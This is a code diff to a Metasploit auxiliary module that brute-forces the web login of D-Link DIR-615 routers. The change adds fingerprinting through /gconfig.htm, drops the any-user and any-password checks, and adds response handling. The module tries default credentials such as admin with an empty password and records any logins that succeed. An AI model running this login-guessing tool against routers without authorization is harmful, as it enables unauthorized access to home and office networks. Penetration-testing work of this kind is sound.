@@ -57,11 +57,39 @@ class Metasploit3 < Msf::Auxiliary
 
 		@uri = "/login.htm"
 
+
+		#doing a first fingerprint
+		fp = fingerprint(ip)
+		return :abort if fp == false
+
 		print_status("Attempting to login to #{target_url}")
 
 		each_user_pass { |user, pass|
 			do_login(user, pass)
 		}
+	end
+
+	def fingerprint(ip)
+		#the tested DIR-615 has no nice Server banner, gconfig.htm gives us interesting 
+		#input to detect this device. Not sure if this works on other devices! Tested on v8.04.
+		begin
+			response = send_request_cgi({
+				'uri' => '/gconfig.htm',
+				'method' => 'GET',
+				}
+			)
+			return if response.nil?
+			return if (response.code == 404)
+
+			#fingerprinting tested on firmware version 8.04
+			if response.body !~ /var\ systemName\=\'DLINK\-DIR615/
+				vprint_error("#{target_url} - Could not detect a DIR-615 router")
+				return false
+			end
+		rescue ::Rex::ConnectionError
+			vprint_error("#{target_url} - Failed to connect to the web server")
+			return nil
+		end
 	end
 
 	#default to user=admin without password (default on most dlink routers)
@@ -74,29 +102,6 @@ class Metasploit3 < Msf::Auxiliary
 		if result == :success
 			print_good("#{target_url} - Successful login '#{user}' : '#{pass}'")
 
-			any_user = false
-			any_pass = false
-
-			vprint_status("#{target_url} - Trying random username with password:'#{pass}'")
-			any_user  =  determine_result(do_http_login(Rex::Text.rand_text_alpha(8), pass))
-
-			vprint_status("#{target_url} - Trying username:'#{user}' with random password")
-			any_pass  = determine_result(do_http_login(user, Rex::Text.rand_text_alpha(8)))
-
-			if any_user == :success
-				user = "anyuser"
-				print_status("#{target_url} - Any username with password '#{pass}' is allowed")
-			else
-				print_status("#{target_url} - Random usernames are not allowed.")
-			end
-
-			if any_pass == :success
-				pass = "anypass"
-				print_status("#{target_url} - Any password with username '#{user}' is allowed")
-			else
-				print_status("#{target_url} - Random passwords are not allowed.")
-			end
-
 			report_auth_info(
 				:host   => rhost,
 				:port   => rport,
@@ -107,7 +112,6 @@ class Metasploit3 < Msf::Auxiliary
 				:active => true
 			)
 
-			return :abort if ([any_user,any_pass].include? :success)
 			return :next_user
 		else
 			vprint_error("#{target_url} - Failed to login as '#{user}'")
@@ -130,6 +134,9 @@ class Metasploit3 < Msf::Auxiliary
 					"captchapwd" => ""
 				}
 			})
+			return if response.nil?
+			return if (response.code == 404)
+
 			return response
 		rescue ::Rex::ConnectionError
 			vprint_error("#{target_url} - Failed to connect to the web server")
